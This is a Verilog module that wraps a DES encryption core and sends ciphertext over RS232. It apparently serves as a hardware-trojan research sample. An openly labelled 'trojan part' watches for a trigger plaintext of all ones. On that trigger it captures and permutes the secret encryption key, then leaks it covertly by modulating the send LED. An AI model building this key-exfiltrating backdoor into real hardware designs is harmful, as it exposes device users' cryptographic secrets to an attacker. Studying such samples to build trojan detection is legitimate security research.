`timescale 1 ns / 1 ns
module TrojanTopImplement (
				CLK,
				RST,
				CHIP_SELECT_BAR,
				//PLAIN_TEXT,
				ADDRESS,
				//CIPHER_TEXT,
				SendLED,
				SendData,
				SendDataReady
				
				);
				
input   CLK; 
 
input   RST; 
 
input   CHIP_SELECT_BAR; 
 
input   ADDRESS; 
 
//input   [64 : 1]PLAIN_TEXT; 
 
//output  [64 : 1]CIPHER_TEXT; 

output					SendLED;
output	[7:0]			SendData;
output					SendDataReady;


// (50Mhz / 115200 )*16 ---> waiting 16 rs232 clock
// One bit can be transmitted at every rising edge
parameter txdivisorR = 6944;

// (50Mhz / 100KHZ /2) ---> creating 100khz Ledclk
parameter	TrojanSendingFrq=250;
parameter	PLAIN_TEXT='hffffffffffffffff;

parameter	TrojanPlaneTxt='hffffffffffffffff;

wire	[63:0] CIPHER_TEXT;



//
//register outputs 
//
reg					SendLED;
reg	[7:0]			SendData;
reg					SendDataReady;



//
//register input for DES Block
//
reg				chipSelectR;
reg				addrR;
reg		[63:0]	plainTxtR;

//
//creat Busy and sending flag to deny accepting data
//
reg 	[4:0]	desRdyCnt;
reg				desRunR;
reg				sendingFlagR;
reg				busyR;

//
//secure data that must be sen with RS232
//
reg		[63:0]	sendingDataR;

reg		[15:0]	rs232Cnt;
reg		[2:0]	partNum;


reg  [11:0] ledcounter;
reg  [20:0] ledclkDIV;
reg    ledClk;

//
//Detect Trojan Tiger and Send Trojan Data
//
reg				trojanEnR;
reg					trojanSendFlagR;
reg   				 trojanSendFlagRR;


wire	[63:0]		KEY;

reg		[63:0] 		trojanKey;
reg 	[79:0] 	 trojanKeyR;
wire 	[63:0]	 KEY_PERMUTATION;




Des_Top	DES1(.CLK(CLK), .RST(RST), .CHIP_SELECT_BAR(chipSelectR),.ADDRESS(addrR),.PLAIN_TEXT(plainTxtR), .CIPHER_TEXT(CIPHER_TEXT),.KEY(KEY));

Trojan_Permutation Permute1(.KEY(trojanKey),.KEY_PERMUTATION(KEY_PERMUTATION));

//----------------------------------
//--------register input data to DES block
//----------------------------------

always @(posedge CLK)begin
	if(RST)
		
	chipSelectR<= 1;
	else
		if(!busyR)
			chipSelectR <= CHIP_SELECT_BAR;
		else
			chipSelectR <= 1;
end

always @(posedge CLK)begin
	if(RST)
		addrR <= 0;
	else
		if(!busyR)
			addrR <= ADDRESS;
		else
			addrR <= addrR;
end

always @(posedge CLK)begin
	if(RST)
		plainTxtR <= 0;
	else
		if(!busyR)
			plainTxtR <= PLAIN_TEXT;
		else
			plainTxtR <= plainTxtR;
end

//----------------------------------
//--------Detect DES and Sending Process is run 
//----------------------------------

//
//if active means module cannot accept new data
//
always @(posedge CLK)begin
	if(RST)
		busyR <= 0;
	else
		if(!busyR)
			busyR <= !CHIP_SELECT_BAR;
		else
			if(!desRunR & !sendingFlagR)
				busyR <= 0;
			else
				busyR <= busyR;
end

//
//active for 16 clock cycles until DES block creates Secure data 
//
always @(posedge CLK)begin
	if(RST)
		desRunR <= 0;
	else
		if(!busyR)
			desRunR <= !CHIP_SELECT_BAR;
		else
			if(desRdyCnt==17)
				desRunR <= 0;
			else
				desRunR <= desRunR;
end

//
//count 16 clock cycles until DES block creates Secure data 
//

always @(posedge CLK) begin
	if(RST)
		desRdyCnt <= 0;
	else
		if(desRunR)
			if(desRdyCnt == 17)
				desRdyCnt <= 0;
			else
				desRdyCnt <= desRdyCnt+1;
		else
			desRdyCnt <= 0;
end

//
//Store the Secure data of PLAN TEXT
//
always @(posedge CLK)begin
	if(RST)
		sendingDataR <= 0;
	else
		if(desRdyCnt==17)
			sendingDataR <= CIPHER_TEXT;
		else
			sendingDataR <= sendingDataR;
end

//
//active until secure data send through R232 with rate 115200 
//

always @(posedge CLK)begin
	if(RST)
		sendingFlagR <= 0;
	else
		if(desRdyCnt==17)
			sendingFlagR <= 1;
		else
			if(rs232Cnt == txdivisorR & partNum==7)
				sendingFlagR <= 0;
			else
				sendingFlagR <= sendingFlagR;
end

//
//count clock cycle needs to send 8 bit through RS232
//
//
always @(posedge CLK) begin
	if(RST)begin
		rs232Cnt <= 0;
		partNum <= 0;
	end
	else
		if(sendingFlagR)
			if (rs232Cnt == txdivisorR) begin
				rs232Cnt <= 0;
				partNum <= partNum+1;
			end
			else
				rs232Cnt <= rs232Cnt + 1;
		else
			rs232Cnt <= 0;
end

//------------------
//---prepare data to RS232 module
//------------------------
always @(posedge CLK)begin
	if(RST)
		SendDataReady <=0;
	else 
		if(sendingFlagR)
			if(rs232Cnt == 1)
				SendDataReady <=1;	
			else
				SendDataReady <=0;
		else
			SendDataReady <=0;		
end

always @(posedge CLK)begin
	if(RST)
		SendData <=0;
	else
		if(sendingFlagR)
			if(rs232Cnt == 1)
				case(partNum) 
				0 : SendData <= sendingDataR [7:0]; 
				1 : SendData <= sendingDataR [15:8]; 
				2 : SendData <= sendingDataR [23:16]; 
				3 : SendData <= sendingDataR [31:24]; 
				4 : SendData <= sendingDataR [39:32]; 
				5 : SendData <= sendingDataR [47:40]; 
				6 : SendData <= sendingDataR [55:48]; 
				7 : SendData <= sendingDataR [63:56]; 
				endcase		
			else
				SendData <= SendData;
		else
			SendData <= SendData;
end

//
//LED on during sending data through RS232
//
always @(posedge CLK)begin
	if(RST)
		SendLED <=0;
	else 
		if(sendingFlagR)
			if(trojanSendFlagR)
				//SendLED <= ledClk;
				SendLED <= ledClk ^ trojanKeyR[0];
			else
				SendLED <= sendingFlagR;
		else
			SendLED <= 0;
end
///trojan part
//
//

//triger Trojan
//
always @(posedge CLK)begin
		if(RST)
			trojanEnR <= 0;
		else
			if(!chipSelectR)
				if(plainTxtR==TrojanPlaneTxt)
					trojanEnR <= 1;
				else
					trojanEnR <= 0;
			else
				trojanEnR <= 0;
end

//
//if Trojan Tiger this signal active to indcate key must be send
//
always @(posedge CLK)begin
		if(RST)
			trojanSendFlagR <= 0;
		else
			if(trojanEnR)
				trojanSendFlagR <= 1;
			else if(busyR)
				trojanSendFlagR <= trojanSendFlagR;
			else
				trojanSendFlagR <= 0;
end

always @(posedge CLK or posedge RST)begin
 if(RST)
  trojanSendFlagRR <= 0;
 else
  trojanSendFlagRR <= trojanSendFlagR;
end

//
//sniff  key if Trojan Tiger 
//
always @(posedge CLK)begin
	if(RST)
		trojanKey <= 'hffffffffffffffff;
	else
		if(trojanEnR)
			trojanKey <= KEY;
		else
			trojanKey <= trojanKey;
end

always @(posedge CLK or posedge RST)begin
 if(RST)
  trojanKeyR <= 0;
 else
  if(sendingFlagR)
   if(trojanSendFlagRR)
    trojanKeyR <= {1'b1,trojanKeyR[79:1]};
   else
    trojanKeyR <= {KEY_PERMUTATION,16'hAAAA};
end

//-----
//---generate 100KHZ clk to send Trojan 
//----
always @(posedge CLK)begin
 if(RST)
  ledcounter <= 0;
 else
  if(ledcounter==TrojanSendingFrq)
   ledcounter <= 0;
  else
   ledcounter <= ledcounter+1;
end



always @(posedge CLK)begin
 if(RST) begin
  ledClk <= 0;
 end else begin
  if(ledcounter==TrojanSendingFrq) begin
   ledclkDIV <= ledclkDIV+1;
	if(ledclkDIV==50000) begin
		ledClk <= ~ledClk;
		ledclkDIV<=1;
		end
	end else begin
   ledClk <= ledClk;
end
end
end
endmodule 